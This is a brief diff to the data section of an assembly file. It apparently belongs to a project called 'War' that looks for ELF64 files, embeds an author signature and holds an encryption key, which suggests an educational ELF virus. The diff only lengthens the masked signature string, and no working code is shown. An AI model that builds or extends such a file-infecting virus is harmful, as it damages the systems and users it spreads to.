@@ -1,7 +1,7 @@
 file_size dq 0
 file	db 'elf64 found!', 0
 
-signature	db 'War version 1.0 (c)oded by alexafer-jdecorte - XXXXXXXXXXXXXXXX', 0
+signature	db 'War version 1.0 (c)oded by alexafer-jdecorte - XXXXXXXXXXXXXXXX:XXXXXXXXXX.XXXXXXXXXX', 0
 encryption_key   dq 0xdeadbeefcafebabe
 
 
